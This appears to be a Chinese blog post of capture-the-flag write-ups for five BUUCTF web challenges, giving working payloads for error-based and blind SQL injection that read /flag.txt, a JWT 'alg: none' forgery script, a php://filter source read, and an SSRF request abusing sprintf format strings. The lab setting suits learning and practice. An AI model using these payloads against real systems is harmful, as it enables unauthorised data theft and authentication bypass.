@@ -1,0 +1,379 @@
+
+ <!DOCTYPE HTML>
+<html lang="en">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+  
+    <title>BUUCTF | buxqm</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=3, minimum-scale=1">
+    
+    <meta name="author" content="Ycj">
+    
+    <meta name="description" content="[CISCN2019 华北赛区 Day1 Web5]CyberPunk打开题目，查看界面源码发现提示?file，于是将源码读取，发现address处没有过滤，在change.php中发现二次注入点
+随便注入以下，发现报错，果然就是报错注入了，数据库逛了一圈，啥也没有，发现题目把load_fileBA">
+    
+    
+    
+    
+    
+    <link rel="icon" href="/img/favicon.ico">
+    
+    
+    <link rel="apple-touch-icon" href="/img/author.jpg">
+    <link rel="apple-touch-icon-precomposed" href="/img/author.jpg">
+    
+    <link rel="stylesheet" href="/css/style.css">
+</head>
+</html>
+  <body>
+    <header>
+      <div>
+		
+			<div id="imglogo">
+				<a href="/"><img src="/img/logo.svg" alt="buxqm" title="buxqm"/></a>
+			</div>
+			
+			<div id="textlogo">
+				<h1 class="site-name"><a href="/" title="buxqm">buxqm</a></h1>
+				<h2 class="blog-motto"></h2>
+			</div>
+			<div class="navbar"><a class="navbutton navmobile" href="#" title="Menu">
+			</a></div>
+			<nav class="animated">
+				<ul>
+					
+						<li><a href="/">Home</a></li>
+					
+						<li><a href="/archives">Archives</a></li>
+					
+					<li>
+					
+					<form class="search" action="//google.com/search" method="get" accept-charset="utf-8">
+						<label>Search</label>
+						<input type="text" id="search" name="q" autocomplete="off" maxlength="20" placeholder="Search" />
+						<input type="hidden" name="q" value="site:yoursite.com">
+					</form>
+					
+					</li>
+				</ul>
+			</nav>			
+</div>
+
+    </header>
+    <div id="container">
+      <div id="main" class="post" itemscope itemprop="blogPost">
+	<article itemprop="articleBody"> 
+		<header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/2019/10/02/BUUCTF2/" title="BUUCTF" itemprop="url">BUUCTF</a>
+  </h1>
+  <p class="article-author">By
+    
+      <a href="http://yoursite.com" title="Ycj">Ycj</a>
+    </p>
+  <p class="article-time">
+    <time datetime="2019-10-01T16:00:00.000Z" itemprop="datePublished">2019-10-02</time>
+    Updated:<time datetime="2020-10-04T06:25:32.394Z" itemprop="dateModified">2020-10-04</time>
+    
+  </p>
+</header>
+	<div class="article-content">
+		
+		
+		<div id="toc" class="toc-article">
+			<strong class="toc-title">Contents</strong>
+		<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#CISCN2019-华北赛区-Day1-Web5-CyberPunk"><span class="toc-number">1.</span> <span class="toc-text">[CISCN2019 华北赛区 Day1 Web5]CyberPunk</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Zer0pts2020-Can-you-guess-it"><span class="toc-number">2.</span> <span class="toc-text">[Zer0pts2020]Can you guess it?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HFCTF2020-EasyLogin"><span class="toc-number">3.</span> <span class="toc-text">[HFCTF2020]EasyLogin</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BJDCTF-2nd-文件探测"><span class="toc-number">4.</span> <span class="toc-text">[BJDCTF 2nd]文件探测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GYCTF2020-Ezsqli"><span class="toc-number">5.</span> <span class="toc-text">[GYCTF2020]Ezsqli</span></a></li></ol>
+		</div>
+		
+		<h2 id="CISCN2019-华北赛区-Day1-Web5-CyberPunk"><a href="#CISCN2019-华北赛区-Day1-Web5-CyberPunk" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web5]CyberPunk"></a>[CISCN2019 华北赛区 Day1 Web5]CyberPunk</h2><p>打开题目，查看界面源码发现提示?file，于是将源码读取，发现address处没有过滤，在change.php中发现二次注入点<img src="https://i.loli.net/2020/10/02/Nt4MJyQTmqIBuzb.png" alt></p>
+<p>随便注入以下，发现报错，果然就是报错注入了，数据库逛了一圈，啥也没有，发现题目把load_fileBAN了，就试试直接读flag，因为是ciscn的题目，所以flag都在/flag.txt，由于报错长度限制，分两次爆。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&apos;,`address`= updatexml(1,concat(0x3a,(select substr(load_file(&apos;/flag.txt&apos;),1,25)),0x3a),1)#</span><br><span class="line">&apos;,`address`= updatexml(1,concat(0x3a,(select substr(load_file(&apos;/flag.txt&apos;),25,50)),0x3a),1)#</span><br></pre></td></tr></table></figure>
+
+<h2 id="Zer0pts2020-Can-you-guess-it"><a href="#Zer0pts2020-Can-you-guess-it" class="headerlink" title="[Zer0pts2020]Can you guess it?"></a>[Zer0pts2020]Can you guess it?</h2><p>题目给出源码，看了一下，guess是不可能猜中，也不可能绕过的，所以点肯定在<code>basename($_SERVER[&#39;PHP_SELF&#39;])</code>这里。</p>
+<p>basename函数当路径以/结尾时，会返回/前面的内容，当文件名只含有一个非ascii码字符时，basename会将它忽略，所以可以用<code>/index.php/config.php/%ff?source</code>读取flag。</p>
+<h2 id="HFCTF2020-EasyLogin"><a href="#HFCTF2020-EasyLogin" class="headerlink" title="[HFCTF2020]EasyLogin"></a>[HFCTF2020]EasyLogin</h2><p>打开看发现是koa框架，网上查一查，koa通常会在controllers目录中存放处理逻辑js代码，通常是放在api.js/user.js中，访问controllser/api.js得到逻辑代码，发现是一道JWT伪造。</p>
+<p>当username=admin时，可以访问/flag。</p>
+<p>JWT自身加密的问题，我们可以用alg=’none’绕过，只需要绕过下面这一段代码就行。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(sid === <span class="literal">undefined</span> || sid === <span class="literal">null</span> || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;= <span class="number">0</span>)) &#123;</span><br><span class="line">  <span class="keyword">throw</span> <span class="keyword">new</span> APIError(<span class="string">'login error'</span>, <span class="string">'no such secret id'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里时一个JS的弱类型问题，以下代码是成立的。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> a =[]</span><br><span class="line"><span class="keyword">if</span>(a==<span class="number">0</span>)&#123;</span><br><span class="line">	<span class="built_in">console</span>.log(a)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们只需要构造secretid=[]即可绕过判断。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">headers=&#123;</span><br><span class="line"><span class="string">'type'</span>:<span class="string">'jwt'</span>,</span><br><span class="line"><span class="string">'alg'</span>:<span class="string">"none"</span></span><br><span class="line">&#125;</span><br><span class="line">payload=&#123;</span><br><span class="line"><span class="string">'iat'</span>:<span class="number">1587378820</span>,</span><br><span class="line"><span class="string">'username'</span>:<span class="string">'admin'</span>,</span><br><span class="line"><span class="string">'password'</span>:<span class="string">'123'</span>,</span><br><span class="line"><span class="string">'secretid'</span>:[]</span><br><span class="line">&#125;</span><br><span class="line">he=json.dumps(headers)</span><br><span class="line">pa=json.dumps(payload)</span><br><span class="line">a=base64.b64encode(he.encode(<span class="string">'utf-8'</span>)).decode(<span class="string">'utf-8'</span>)</span><br><span class="line">b=base64.b64encode(pa.encode(<span class="string">'utf-8'</span>)).decode(<span class="string">'utf-8'</span>)</span><br><span class="line">print(a+<span class="string">'.'</span>+b)</span><br></pre></td></tr></table></figure>
+
+<h2 id="BJDCTF-2nd-文件探测"><a href="#BJDCTF-2nd-文件探测" class="headerlink" title="[BJDCTF 2nd]文件探测"></a>[BJDCTF 2nd]文件探测</h2><p>答开题目，抓包发现提示home.php，进入发现直接跳到了system.php，F12再network处查看网络请求，发现了home.php?file=system请求，试试伪协议读源码。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=php://filter/read=convert.base64-encode/resource=home</span><br></pre></td></tr></table></figure>
+
+<p>将home和system的代码都读取出来，再home.php中发现存在admin.php，但是要本地访问，flag也被限制的死死的，于是只能在system.php找找。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'q1'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'q2'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'q3'</span>]) ) &#123;</span><br><span class="line">    $url = $_POST[<span class="string">'q2'</span>].<span class="string">".y1ng.txt"</span>;</span><br><span class="line">    $method = $_POST[<span class="string">'q3'</span>];</span><br><span class="line"></span><br><span class="line">    $str1 = <span class="string">"~$ python fuck.py -u \""</span>.$url .<span class="string">"\" -M $method -U y1ng -P admin123123 --neglect-negative --debug --hint=xiangdemei&lt;br&gt;"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> $str1;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!preg_match($filter1, $url) )&#123;</span><br><span class="line">        <span class="keyword">die</span>($str2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (preg_match($filter2, $url)) &#123;</span><br><span class="line">        <span class="keyword">die</span>($str3);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">'/^GET/i'</span>, $method) &amp;&amp; !preg_match(<span class="string">'/^POST/i'</span>, $method)) &#123;</span><br><span class="line">        <span class="keyword">die</span>($str4);</span><br><span class="line">    &#125;</span><br><span class="line">    $detect = @file_get_contents($url, <span class="keyword">false</span>);</span><br><span class="line">    <span class="keyword">print</span>(sprintf(<span class="string">"$url method&amp;content_size:$method%d"</span>, $detect));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>要求q2必须要以<code>http://127.0.0.1</code>开头，那估计就是用file_get_contents打开admin.php了，发现$url在q2后拼接了字符串，这个可以在q2后加#锚点符或者参数<code>?a=</code>这种形式绕过，最后发现它使用%d来打印返回内容，这肯定要把它改成%s才行。</p>
+<p>在<a href="https://www.php.net/manual/zh/function.sprintf.php" target="_blank" rel="noopener">官网</a>搜到，sprintf能够指定参数位置<code>%[argnum$][flags][width][.precision]</code></p>
+<p>所以可以指定使用<code>%1$s</code>能够将$detect转变为字符串输出。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">q1=flag&amp;q2=http://127.0.0.1/admin.php?a=%1$s&amp;q3=get</span><br></pre></td></tr></table></figure>
+
+<p>同时在官网可以看到</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">notice the double %%, this prints a literal &apos;%&apos; character</span><br></pre></td></tr></table></figure>
+
+<p>两个%%符号会输出真正的%，所以也能利用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">q1=flag&amp;q2=http://127.0.0.1/admin.php?a=&amp;q3=get%s%</span><br></pre></td></tr></table></figure>
+
+<p>成功获得admin.php代码</p>
+<p>admin.php的逻辑非常的脆弱，AES-128-CBC的加密数据是存放在session中的，如果不带sessionid访问，加密数据就是空，我们可以构造出加密空数据后的$cipher</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function aesEn($data, $key)</span><br><span class="line">&#123;</span><br><span class="line">    $method = &apos;AES-128-CBC&apos;;</span><br><span class="line">    $iv = md5(&quot;174.0.0.15&quot;,true);</span><br><span class="line">    return  base64_encode(openssl_encrypt($data, $method,$key, OPENSSL_RAW_DATA , $iv));</span><br><span class="line">&#125;</span><br><span class="line">echo aesEn(&apos;&apos;,&apos;y1ng&apos;);</span><br></pre></td></tr></table></figure>
+
+<p>将上面的输出传给decrypt，即可得到flag。</p>
+<h2 id="GYCTF2020-Ezsqli"><a href="#GYCTF2020-Ezsqli" class="headerlink" title="[GYCTF2020]Ezsqli"></a>[GYCTF2020]Ezsqli</h2><p>简单判断一下，是一道数字型盲注，过滤了or、union等字符，首先将数据库版本弄到</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(ascii(substr((version()),1,1))&gt;52,1,0)</span><br></pre></td></tr></table></figure>
+
+<p>版本是5.7.29，在此版本中，sys增加了可以查看表名的视图</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(table_name) from sys.schema_table_statistics where table_schema=database()</span><br></pre></td></tr></table></figure>
+
+<p>得到表名<code>f1ag_1s_h3r3_hhhhh</code>,由于过滤了union，只能使用<a href="https://dev.mysql.com/doc/refman/8.0/en/row-subqueries.html" target="_blank" rel="noopener">Row Subqueries</a>，在mysql中，字符串的比较是按照字典序来比的即<code>&#39;g&#39;&gt;&#39;fzz&#39;</code>，所以以下表达式成立</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">((1,&apos;g&apos;)&gt;(select * from f1ag_1s_h3r3_hhhhh))</span><br></pre></td></tr></table></figure>
+
+<p>可以按照这样的思路去爆破，不过爆破出来的结果需要减去1。</p>
+  
+	</div>
+		<footer class="article-footer clearfix">
+
+
+<div class="article-categories">
+  <span></span>
+  <a class="article-category-link" href="/categories/writeup/">writeup</a>
+</div>
+
+
+
+<div class="article-share" id="share">
+
+  <div data-url="http://yoursite.com/2019/10/02/BUUCTF2/" data-title="BUUCTF | buxqm" data-tsina="" class="share clearfix">
+  </div>
+
+</div>
+</footer>   	       
+	</article>
+	
+<nav class="article-nav clearfix">
+ 
+ <div class="prev" >
+ <a href="/2020/06/30/XXE专题/" title="XML学习">
+  <strong>PREVIOUS:</strong><br/>
+  <span>
+  XML学习</span>
+</a>
+</div>
+
+
+<div class="next">
+<a href="/2019/09/28/SSRF学习/"  title="SSRF">
+ <strong>NEXT:</strong><br/> 
+ <span>SSRF
+</span>
+</a>
+</div>
+
+</nav>
+
+	
+<section class="comment">
+	<div class="ds-thread"></div>
+</section>
+
+</div>  
+      <div class="openaside"><a class="navbutton" href="#" title="Show Sidebar"></a></div>
+
+  <div id="toc" class="toc-aside">
+  <strong class="toc-title">Contents</strong>
+  <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#CISCN2019-华北赛区-Day1-Web5-CyberPunk"><span class="toc-number">1.</span> <span class="toc-text">[CISCN2019 华北赛区 Day1 Web5]CyberPunk</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Zer0pts2020-Can-you-guess-it"><span class="toc-number">2.</span> <span class="toc-text">[Zer0pts2020]Can you guess it?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HFCTF2020-EasyLogin"><span class="toc-number">3.</span> <span class="toc-text">[HFCTF2020]EasyLogin</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BJDCTF-2nd-文件探测"><span class="toc-number">4.</span> <span class="toc-text">[BJDCTF 2nd]文件探测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GYCTF2020-Ezsqli"><span class="toc-number">5.</span> <span class="toc-text">[GYCTF2020]Ezsqli</span></a></li></ol>
+  </div>
+
+<div id="asidepart">
+<div class="closeaside"><a class="closebutton" href="#" title="Hide Sidebar"></a></div>
+<aside class="clearfix">
+
+  
+<div class="categorieslist">
+	<p class="asidetitle">Categories</p>
+		<ul>
+		
+			<li><a href="/categories/XXE/" title="XXE">XXE<sup>1</sup></a></li>
+		
+			<li><a href="/categories/trick/" title="trick">trick<sup>1</sup></a></li>
+		
+			<li><a href="/categories/writeup/" title="writeup">writeup<sup>2</sup></a></li>
+		
+			<li><a href="/categories/专题-writeup/" title="专题  writeup">专题  writeup<sup>1</sup></a></li>
+		
+			<li><a href="/categories/协议学习/" title="协议学习">协议学习<sup>1</sup></a></li>
+		
+		</ul>
+</div>
+
+
+  
+
+  <div class="rsspart">
+	<a href="" target="_blank" title="rss">RSS</a>
+</div>
+
+</aside>
+</div>
+    </div>
+    <footer><div id="footer" >
+	
+	<div class="line">
+		<span></span>
+		<div class="author"></div>
+	</div>
+	
+	
+	<section class="info">
+		<p> Hello <br/>
+			似水流年</p>
+	</section>
+	 
+	<div class="social-font clearfix">
+		
+		
+		
+		
+		
+	</div>
+		<p class="copyright">Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/A-limon/pacman" target="_blank" title="Pacman">Pacman</a> © 2020 
+		
+		<a href="http://yoursite.com" target="_blank" title="Ycj">Ycj</a>
+		
+		</p>
+</div>
+</footer>
+    <script src="/js/jquery-2.1.0.min.js"></script>
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.navbar').click(function(){
+    $('header nav').toggleClass('shownav');
+  });
+  var myWidth = 0;
+  function getSize(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+  };
+  var m = $('#main'),
+      a = $('#asidepart'),
+      c = $('.closeaside'),
+      o = $('.openaside');
+  $(window).resize(function(){
+    getSize(); 
+    if (myWidth >= 1024) {
+      $('header nav').removeClass('shownav');
+    }else
+    {
+      m.removeClass('moveMain');
+      a.css('display', 'block').removeClass('fadeOut');
+      o.css('display', 'none');
+      
+      $('#toc.toc-aside').css('display', 'none');
+        
+    }
+  });
+  c.click(function(){
+    a.addClass('fadeOut').css('display', 'none');
+    o.css('display', 'block').addClass('fadeIn');
+    m.addClass('moveMain');
+  });
+  o.click(function(){
+    o.css('display', 'none').removeClass('beforeFadeIn');
+    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
+    m.removeClass('moveMain');
+  });
+  $(window).scroll(function(){
+    o.css("top",Math.max(80,260-$(this).scrollTop()));
+  });
+});
+</script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var ai = $('.article-content>iframe'),
+      ae = $('.article-content>embed'),
+      t  = $('#toc'),
+      h  = $('article h2')
+      ah = $('article h2'),
+      ta = $('#toc.toc-aside'),
+      o  = $('.openaside'),
+      c  = $('.closeaside');
+  if(ai.length>0){
+    ai.wrap('<div class="video-container" />');
+  };
+  if(ae.length>0){
+   ae.wrap('<div class="video-container" />');
+  };
+  if(ah.length==0){
+    t.css('display','none');
+  }else{
+    c.click(function(){
+      ta.css('display', 'block').addClass('fadeIn');
+    });
+    o.click(function(){
+      ta.css('display', 'none');
+    });
+    $(window).scroll(function(){
+      ta.css("top",Math.max(140,320-$(this).scrollTop()));
+    });
+  };
+});
+</script>
+
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var $this = $('.share'),
+      url = $this.attr('data-url'),
+      encodedUrl = encodeURIComponent(url),
+      title = $this.attr('data-title'),
+      tsina = $this.attr('data-tsina');
+  var html = [
+  '<a href="#" class="overlay" id="qrcode"></a>',
+  '<div class="qrcode clearfix"><span>扫描二维码分享到微信朋友圈</span><a class="qrclose" href="#share"></a><strong>Loading...Please wait</strong><img id="qrcode-pic" data-src="http://s.jiathis.com/qrcode.php?url=' + encodedUrl + '"/></div>',
+  '<a href="#textlogo" class="article-back-to-top" title="Top"></a>',
+  '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="article-share-facebook" target="_blank" title="Facebook"></a>',
+  '<a href="#qrcode" class="article-share-qrcode" title="QRcode"></a>',
+  '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="article-share-twitter" target="_blank" title="Twitter"></a>',
+  '<a href="http://service.weibo.com/share/share.php?title='+title+'&url='+encodedUrl +'&ralateUid='+ tsina +'&searchPic=true&style=number' +'" class="article-share-weibo" target="_blank" title="Weibo"></a>',
+  '<span title="Share to"></span>'
+  ].join('');
+  $this.append(html);
+  $('.article-share-qrcode').click(function(){
+    var imgSrc = $('#qrcode-pic').attr('data-src');
+    $('#qrcode-pic').attr('src', imgSrc);
+    $('#qrcode-pic').load(function(){
+        $('.qrcode strong').text(' ');
+    });
+  });
+});     
+</script>
+
+
+<script type="text/javascript">
+  var duoshuoQuery = {short_name:""};
+  (function() {
+    var ds = document.createElement('script');
+    ds.type = 'text/javascript';ds.async = true;
+    ds.src = '//static.duoshuo.com/embed.js';
+    ds.charset = 'UTF-8';
+    (document.getElementsByTagName('head')[0] 
+    || document.getElementsByTagName('body')[0]).appendChild(ds);
+  })();
+</script> 
+
+
+
+
+
+  </body>
+</html>
